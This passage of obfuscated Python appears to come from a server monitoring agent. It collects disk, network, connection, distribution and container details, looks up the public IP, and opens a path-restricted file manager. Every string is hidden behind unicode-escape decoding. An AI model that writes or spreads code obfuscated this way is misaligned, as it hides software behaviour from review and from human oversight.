        O0_var_164 = codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0062\\u006c\\u006f\\u0063\\u006b\\u002f', 'unicode_escape') + str(O0_var_160)
        if os.path.exists(O0_var_164):
            O0_var_165 = os.path.realpath(os.path.dirname(O0_var_164))
            O0_var_166 = os.path.realpath(O0_var_164)
            if not os.path.isdir(O0_var_166):
                O0_var_167 = os.path.dirname(O0_var_165)
                if O0_var_167.endswith(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0062\\u006c\\u006f\\u0063\\u006b', 'unicode_escape')):
                    O0_var_168 = os.path.basename(O0_var_165)
                    if self._is_physical_disk(codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape') + str(O0_var_168)):
                        return codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape') + str(O0_var_168)
        return None

    def _get_container_disk_info(self) -> Dict[str, int]:
        try:
            O0_var_169 = psutil.disk_usage(codecs.decode('\\u002f', 'unicode_escape'))
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): int(O0_var_169.total), codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): int(O0_var_169.used)}
        except Exception as e:
            Logger.debug(codecs.decode('\\u005b\\u5bb9\\u5668\\u6a21\\u5f0f\\u005d\\u0020\\u83b7\\u53d6\\u78c1\\u76d8\\u4fe1\\u606f\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 5)
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}

    async def _get_host_disk_info(self) -> Dict[str, int]:
        try:
            O0_var_170 = 0
            O0_var_171 = 0
            O0_var_172 = set()
            O0_var_173 = psutil.disk_partitions(all=True)
            for O0_var_174 in O0_var_173:
                O0_var_175 = O0_var_174.device
                O0_var_176 = O0_var_174.mountpoint
                O0_var_177 = O0_var_174.fstype
                if O0_var_177 in {codecs.decode('\\u0074\\u006d\\u0070\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u0076\\u0074\\u006d\\u0070\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u006f\\u0076\\u0065\\u0072\\u006c\\u0061\\u0079', 'unicode_escape'), codecs.decode('\\u0073\\u0071\\u0075\\u0061\\u0073\\u0068\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0070\\u0072\\u006f\\u0063', 'unicode_escape'), codecs.decode('\\u0073\\u0079\\u0073\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u0062\\u0075\\u0067\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070', 'unicode_escape'), codecs.decode('\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u0032', 'unicode_escape'), codecs.decode('\\u0070\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'), codecs.decode('\\u0062\\u0070\\u0066', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u0063\\u0065\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0073\\u0065\\u0063\\u0075\\u0072\\u0069\\u0074\\u0079\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0065\\u0066\\u0069\\u0076\\u0061\\u0072\\u0066\\u0073', 'unicode_escape')}:
                    continue
                O0_var_178 = self._get_physical_disk_device(O0_var_175)
                if not O0_var_178 or O0_var_178 in O0_var_172:
                    continue
                if not self._is_physical_disk(O0_var_178):
                    continue
                try:
                    O0_var_179 = psutil.disk_usage(O0_var_176)
                    O0_var_170 += O0_var_179.total
                    O0_var_171 += O0_var_179.used
                    O0_var_172.add(O0_var_178)
                except (PermissionError, OSError):
                    continue
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_170, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_171}
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u78c1\\u76d8\\u4fe1\\u606f\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 5)
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}

    async def _get_disk_info(self) -> Dict[str, int]:
        if self._get_virtualization() in [codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape'), codecs.decode('\\u004c\\u0078\\u0063', 'unicode_escape'), codecs.decode('\\u0050\\u006f\\u0064\\u006d\\u0061\\u006e', 'unicode_escape')]:
            return self._get_container_disk_info()
        return await self._get_host_disk_info()

    async def _get_disk_total(self) -> int:
        O0_var_180 = await self._get_disk_info()
        return O0_var_180[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')]

    def _is_physical_disk(self, O0_var_181: str) -> bool:
        if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
            return any((O0_var_181.lower().startswith(O0_var_182) for O0_var_182 in [codecs.decode('\\u0063\\u003a', 'unicode_escape'), codecs.decode('\\u0064\\u003a', 'unicode_escape'), codecs.decode('\\u0065\\u003a', 'unicode_escape'), codecs.decode('\\u0066\\u003a', 'unicode_escape'), codecs.decode('\\u0067\\u003a', 'unicode_escape'), codecs.decode('\\u0068\\u003a', 'unicode_escape')]))
        import re
        if re.match(codecs.decode('\\u005e\\u005b\\u0061\\u002d\\u007a\\u0041\\u002d\\u005a\\u0030\\u002d\\u0039\\u005c\\u002e\\u005c\\u002d\\u005f\\u005d\\u002b\\u003a', 'unicode_escape'), O0_var_181) or O0_var_181.startswith(codecs.decode('\\u002f\\u002f', 'unicode_escape')):
            return True
        O0_var_183 = [codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u0073\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u0078\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u006e\\u0076\\u006d\\u0065\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u006e\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u006d\\u006d\\u0063\\u0062\\u006c\\u006b\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u006d\\u0064\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u007a\\u0072\\u006f\\u006f\\u0074\\u002f\\u002e\\u002a\\u0024', 'unicode_escape')]
        return any((re.match(O0_var_184, O0_var_181) for O0_var_184 in O0_var_183))

    async def _get_network_stats(self) -> Dict[str, int]:
        try:
            O0_var_185 = psutil.net_io_counters(pernic=True)
            O0_var_186 = time.time()
            O0_var_187 = 0
            O0_var_188 = 0
            O0_var_189 = [codecs.decode('\\u006c\\u006f', 'unicode_escape'), codecs.decode('\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0062\\u0072\\u002d', 'unicode_escape'), codecs.decode('\\u0074\\u0075\\u006e', 'unicode_escape'), codecs.decode('\\u0076\\u0069\\u0072\\u0062\\u0072', 'unicode_escape')]
            for O0_var_190, O0_var_191 in O0_var_185.items():
                if any((O0_var_192 in O0_var_190 for O0_var_192 in O0_var_189)):
                    continue
                O0_var_187 += O0_var_191.bytes_recv
                O0_var_188 += O0_var_191.bytes_sent
            if SystemInfoCollector._last_network_stats[codecs.decode('\\u0072\\u0078', 'unicode_escape')] == 0:
                SystemInfoCollector._total_network_down = O0_var_187
                SystemInfoCollector._total_network_up = O0_var_188
                SystemInfoCollector._last_network_stats = {codecs.decode('\\u0072\\u0078', 'unicode_escape'): O0_var_187, codecs.decode('\\u0074\\u0078', 'unicode_escape'): O0_var_188}
                SystemInfoCollector._last_network_time = O0_var_186
                return {codecs.decode('\\u0075\\u0070', 'unicode_escape'): 0, codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 0, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape'): SystemInfoCollector._total_network_up, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): SystemInfoCollector._total_network_down}
            O0_var_193 = O0_var_186 - SystemInfoCollector._last_network_time
            O0_var_194 = 0
            O0_var_195 = 0
            if O0_var_193 > 0:
                O0_var_195 = (O0_var_187 - SystemInfoCollector._last_network_stats[codecs.decode('\\u0072\\u0078', 'unicode_escape')]) / O0_var_193
                O0_var_194 = (O0_var_188 - SystemInfoCollector._last_network_stats[codecs.decode('\\u0074\\u0078', 'unicode_escape')]) / O0_var_193
                O0_var_195 = max(0, O0_var_195)
                O0_var_194 = max(0, O0_var_194)
                SystemInfoCollector._total_network_down = O0_var_187
                SystemInfoCollector._total_network_up = O0_var_188
            SystemInfoCollector._last_network_stats = {codecs.decode('\\u0072\\u0078', 'unicode_escape'): O0_var_187, codecs.decode('\\u0074\\u0078', 'unicode_escape'): O0_var_188}
            SystemInfoCollector._last_network_time = O0_var_186
            return {codecs.decode('\\u0075\\u0070', 'unicode_escape'): int(O0_var_194), codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): int(O0_var_195), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape'): SystemInfoCollector._total_network_up, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): SystemInfoCollector._total_network_down}
        except Exception as e:
            Logger.debug(codecs.decode('\\u0070\\u0073\\u0075\\u0074\\u0069\\u006c\\u0020\\u6309\\u7f51\\u5361\\u7edf\\u8ba1\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 4)
            return {codecs.decode('\\u0075\\u0070', 'unicode_escape'): 0, codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 0, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape'): 0, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 0}

    async def _get_tcp_connections(self) -> int:
        try:
            if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
                O0_var_196 = subprocess.run([codecs.decode('\\u006e\\u0065\\u0074\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u002d\\u006e', 'unicode_escape'), codecs.decode('\\u002d\\u0070', 'unicode_escape'), codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape')], capture_output=True, text=True, timeout=5)
                return len([O0_var_197 for O0_var_197 in O0_var_196.stdout.split(codecs.decode('\\u000a', 'unicode_escape')) if codecs.decode('\\u0045\\u0053\\u0054\\u0041\\u0042\\u004c\\u0049\\u0053\\u0048\\u0045\\u0044', 'unicode_escape') in O0_var_197])
            O0_var_198 = psutil.net_connections(kind=codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape'))
            return len([O0_var_199 for O0_var_199 in O0_var_198 if O0_var_199.status == codecs.decode('\\u0045\\u0053\\u0054\\u0041\\u0042\\u004c\\u0049\\u0053\\u0048\\u0045\\u0044', 'unicode_escape')])
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0054\\u0043\\u0050\\u8fde\\u63a5\\u6570\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 2)
            return 0

    async def _get_udp_connections(self) -> int:
        try:
            if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
                O0_var_200 = subprocess.run([codecs.decode('\\u006e\\u0065\\u0074\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u002d\\u006e', 'unicode_escape'), codecs.decode('\\u002d\\u0070', 'unicode_escape'), codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape')], capture_output=True, text=True, timeout=5)
                return len([O0_var_201 for O0_var_201 in O0_var_200.stdout.split(codecs.decode('\\u000a', 'unicode_escape')) if codecs.decode('\\u0055\\u0044\\u0050', 'unicode_escape') in O0_var_201 and O0_var_201.strip()])
            return len(psutil.net_connections(kind=codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape')))
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0055\\u0044\\u0050\\u8fde\\u63a5\\u6570\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 2)
            return 0

    def _get_linux_distribution(self) -> Dict[str, str]:
        try:
            if platform.system() == codecs.decode('\\u004c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape') and os.path.exists(codecs.decode('\\u002f\\u0065\\u0074\\u0063\\u002f\\u006f\\u0073\\u002d\\u0072\\u0065\\u006c\\u0065\\u0061\\u0073\\u0065', 'unicode_escape')):
                with open(codecs.decode('\\u002f\\u0065\\u0074\\u0063\\u002f\\u006f\\u0073\\u002d\\u0072\\u0065\\u006c\\u0065\\u0061\\u0073\\u0065', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_202:
                    O0_var_203 = O0_var_202.read()
                O0_var_204, O0_var_205 = (codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape'), codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape'))
                for O0_var_206 in O0_var_203.split(codecs.decode('\\u000a', 'unicode_escape')):
                    if O0_var_206.startswith(codecs.decode('\\u0049\\u0044\\u003d', 'unicode_escape')):
                        O0_var_204 = O0_var_206.replace(codecs.decode('\\u0049\\u0044\\u003d', 'unicode_escape'), codecs.decode('', 'unicode_escape')).replace(codecs.decode('\\u0022', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
                    elif O0_var_206.startswith(codecs.decode('\\u0056\\u0045\\u0052\\u0053\\u0049\\u004f\\u004e\\u005f\\u0049\\u0044\\u003d', 'unicode_escape')):
                        O0_var_205 = O0_var_206.replace(codecs.decode('\\u0056\\u0045\\u0052\\u0053\\u0049\\u004f\\u004e\\u005f\\u0049\\u0044\\u003d', 'unicode_escape'), codecs.decode('', 'unicode_escape')).replace(codecs.decode('\\u0022', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
                return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_204, codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_205}
        except Exception:
            pass
        return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape')}

    def _get_virtualization(self) -> str:

        def try_read(O0_var_207: str) -> str:
            try:
                if os.path.exists(O0_var_207):
                    with open(O0_var_207, codecs.decode('\\u0072', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0069\\u0067\\u006e\\u006f\\u0072\\u0065', 'unicode_escape')) as O0_var_208:
                        return O0_var_208.read()
            except Exception:
                pass
            return codecs.decode('', 'unicode_escape')
        if platform.system() != codecs.decode('\\u004c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape'):
            return codecs.decode('\\u004e\\u006f\\u006e\\u0065', 'unicode_escape')
        try:
            if os.path.exists(codecs.decode('\\u002f\\u002f\\u002e\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072\\u0065\\u006e\\u0076', 'unicode_escape')):
                return codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape')
            if os.path.exists(codecs.decode('\\u002f\\u0072\\u0075\\u006e\\u002f\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u0065\\u006e\\u0076', 'unicode_escape')):
                return codecs.decode('\\u0050\\u006f\\u0064\\u006d\\u0061\\u006e', 'unicode_escape')
            O0_var_209 = try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0031\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070', 'unicode_escape')).lower()
            if codecs.decode('\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape') in O0_var_209 or codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u0064', 'unicode_escape') in O0_var_209:
                return codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape')
            elif codecs.decode('\\u006b\\u0075\\u0062\\u0065\\u0070\\u006f\\u0064\\u0073', 'unicode_escape') in O0_var_209:
                return codecs.decode('\\u004b\\u0075\\u0062\\u0065\\u0072\\u006e\\u0065\\u0074\\u0065\\u0073', 'unicode_escape')
            elif codecs.decode('\\u006c\\u0078\\u0063', 'unicode_escape') in O0_var_209:
                return codecs.decode('\\u004c\\u0058\\u0043', 'unicode_escape')
            O0_var_209 = try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0073\\u0065\\u006c\\u0066\\u002f\\u006d\\u006f\\u0075\\u006e\\u0074\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'))
            if codecs.decode('\\u002f\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072\\u002f\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u0073\\u002f', 'unicode_escape') in O0_var_209 or codecs.decode('\\u0077\\u006f\\u0072\\u006b\\u0064\\u0069\\u0072\\u003d\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u0069\\u0062\\u002f\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape') in O0_var_209:
                return codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape')
            elif codecs.decode('\\u002f\\u0070\\u006f\\u0064\\u0073\\u002f', 'unicode_escape') in O0_var_209 or codecs.decode('\\u006b\\u0075\\u0062\\u0065\\u006c\\u0065\\u0074', 'unicode_escape') in O0_var_209:
                return codecs.decode('\\u004b\\u0075\\u0062\\u0065\\u0072\\u006e\\u0065\\u0074\\u0065\\u0073', 'unicode_escape')
            if codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u003d\\u006c\\u0078\\u0063', 'unicode_escape') in try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0031\\u002f\\u0065\\u006e\\u0076\\u0069\\u0072\\u006f\\u006e', 'unicode_escape')):
                return codecs.decode('\\u004c\\u0058\\u0043', 'unicode_escape')
            O0_var_209 = try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0063\\u0070\\u0075\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'))
            if codecs.decode('\\u0051\\u0045\\u004d\\u0055', 'unicode_escape') in O0_var_209 or codecs.decode('\\u004b\\u0056\\u004d', 'unicode_escape') in O0_var_209:
                return codecs.decode('\\u0051\\u0045\\u004d\\u0055', 'unicode_escape')
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u865a\\u62df\\u5316\\u4fe1\\u606f\\u5931\\u8d25\\u0028\\u975e\\u81f4\\u547d\\u0029\\u003a\\u0020', 'unicode_escape') + str(e), 1)
        return codecs.decode('\\u004e\\u006f\\u006e\\u0065', 'unicode_escape')

    async def _get_public_ip_v4(self) -> Optional[str]:
        O0_var_210 = [codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0061\\u0070\\u0069\\u002e\\u0069\\u0070\\u0069\\u0066\\u0079\\u002e\\u006f\\u0072\\u0067', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0069\\u0063\\u0061\\u006e\\u0068\\u0061\\u007a\\u0069\\u0070\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0063\\u0068\\u0065\\u0063\\u006b\\u0069\\u0070\\u002e\\u0061\\u006d\\u0061\\u007a\\u006f\\u006e\\u0061\\u0077\\u0073\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0069\\u0066\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u002e\\u006d\\u0065\\u002f\\u0069\\u0070', 'unicode_escape')]
        for O0_var_211 in O0_var_210:
            try:
                O0_var_212 = await self._fetch_ip(O0_var_211)
                if O0_var_212 and self._is_valid_ipv4(O0_var_212):
                    return O0_var_212
            except Exception:
                continue
        return None

    async def _get_public_ip_v6(self) -> Optional[str]:
        O0_var_213 = [codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0061\\u0070\\u0069\\u0036\\u002e\\u0069\\u0070\\u0069\\u0066\\u0079\\u002e\\u006f\\u0072\\u0067', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0069\\u0063\\u0061\\u006e\\u0068\\u0061\\u007a\\u0069\\u0070\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')]
        for O0_var_214 in O0_var_213:
            try:
                O0_var_215 = await self._fetch_ip(O0_var_214)
                if O0_var_215 and self._is_valid_ipv6(O0_var_215):
                    return O0_var_215
            except Exception:
                continue
        return None

    async def _fetch_ip(self, O0_var_216: str) -> str:
        O0_var_217 = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(timeout=O0_var_217) as O0_var_218:
            async with O0_var_218.get(O0_var_216, headers={codecs.decode('\\u0075\\u0073\\u0065\\u0072\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): Config.AGENT_VERSION}) as response:
                if response.status == 200:
                    return (await response.text()).strip()
                raise Exception(codecs.decode('\\u0048\\u0054\\u0054\\u0050\\u0020', 'unicode_escape') + str(response.status))

    def _is_valid_ipv4(self, O0_var_219: str) -> bool:
        try:
            socket.inet_pton(socket.AF_INET, O0_var_219)
            return True
        except socket.error:
            return False

    def _is_valid_ipv6(self, O0_var_220: str) -> bool:
        try:
            socket.inet_pton(socket.AF_INET6, O0_var_220)
            return True
        except socket.error:
            return False
import shutil
import stat
import hashlib
import mimetypes
import base64
import json
from pathlib import Path
from datetime import datetime, timezone
from typing import List, Dict, Optional, Union
from fastapi import HTTPException, status, UploadFile
from croniter import croniter

class FileManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u6587\\u4ef6\\u7ba1\\u7406\\u5668\\u0020\\u002d\\u0020\\u5c01\\u88c5\\u6240\\u6709\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u64cd\\u4f5c\\u000a\\u0020\\u0020\\u0020\\u0020\\u5b89\\u5168\\u7279\\u6027\\u003a\\u0020\\u8def\\u5f84\\u6821\\u9a8c\\u3001\\u6743\\u9650\\u68c0\\u67e5\\u3001\\u5ba1\\u8ba1\\u65e5\\u5fd7\\u3001\\u5206\\u5757\\u4e0a\\u4f20\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, root: str, max_upload: int=104857600, chunk_size: int=20971520, audit: bool=True):
        self.O0_fn_56 = Path(root).resolve()
        self.max_upload = max_upload
        self.chunk_size = chunk_size
        self.audit = audit
        self.chunk_dir = self.O0_fn_56 / codecs.decode('\\u002e\\u0070\\u0072\\u006f\\u0078\\u0079\\u005f\\u0063\\u0068\\u0075\\u006e\\u006b\\u0073', 'unicode_escape')
        self.chunk_dir.mkdir(exist_ok=True)

    def _audit(self, O0_var_221: str, path: str, O0_var_222: str, O0_var_223: dict=None):
        if self.audit:
            O0_var_224 = {codecs.decode('\\u0074\\u0073', 'unicode_escape'): datetime.utcnow().isoformat(), codecs.decode('\\u0061\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_221, codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): path, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): O0_var_222, **(O0_var_223 or {})}
            if os.getenv(codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape'):
                Logger.debug(codecs.decode('\\U0001f4dd\\u0020\\u005b\\u0041\\u0055\\u0044\\u0049\\u0054\\u005d\\u0020', 'unicode_escape') + str(json.dumps(O0_var_224, ensure_ascii=False)))

    def _safe_path(self, O0_var_225: str) -> Path:
        O0_var_225 = (O0_var_225 or codecs.decode('\\u002e', 'unicode_escape')).strip()
        O0_var_226 = Path(O0_var_225)
        if not O0_var_226.is_absolute():
            O0_var_226 = self.O0_fn_56 / O0_var_226
        O0_var_226 = O0_var_226.resolve()
        try:
            O0_var_226.relative_to(self.O0_fn_56)
        except ValueError:
            raise HTTPException(status_code=403, detail=codecs.decode('\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064\\u003a\\u0020\\u0027', 'unicode_escape') + str(O0_var_225) + codecs.decode('\\u0027\\u0020\\u006f\\u0075\\u0074\\u0073\\u0069\\u0064\\u0065\\u0020\\u0072\\u006f\\u006f\\u0074\\u0020\\u0027', 'unicode_escape') + str(self.O0_fn_56) + codecs.decode('\\u0027', 'unicode_escape'))
        return O0_var_226

    def _format_info(self, path: Path) -> dict:
        try:
            O0_var_227 = path.lstat() if path.is_symlink() else path.stat()
            return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): path.name, codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(path.relative_to(self.O0_fn_56)), codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079', 'unicode_escape') if path.is_dir() else codecs.decode('\\u0073\\u0079\\u006d\\u006c\\u0069\\u006e\\u006b', 'unicode_escape') if path.is_symlink() else codecs.decode('\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_227.st_size, codecs.decode('\\u006d\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): datetime.fromtimestamp(O0_var_227.st_mtime).isoformat(), codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'): stat.filemode(O0_var_227.st_mode), codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape'): oct(stat.S_IMODE(O0_var_227.st_mode)), codecs.decode('\\u006f\\u0077\\u006e\\u0065\\u0072', 'unicode_escape'): str(O0_var_227.st_uid) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_227.st_gid)}
        except Exception as e:
            return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): path.name, codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(path), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)}

    def list_files(self, base_path: str, recursive: bool=False) -> dict:
        O0_var_228 = self._safe_path(base_path)
        if not O0_var_228.exists():
            raise HTTPException(404, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(base_path))
        if not O0_var_228.is_dir():
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079\\u003a\\u0020', 'unicode_escape') + str(base_path))
        O0_var_229 = []
        try:
            O0_var_230 = O0_var_228.rglob(codecs.decode('\\u002a', 'unicode_escape')) if recursive else O0_var_228.iterdir()
            for O0_var_231 in O0_var_230:
                if not recursive and O0_var_231.parent != O0_var_228:
                    continue
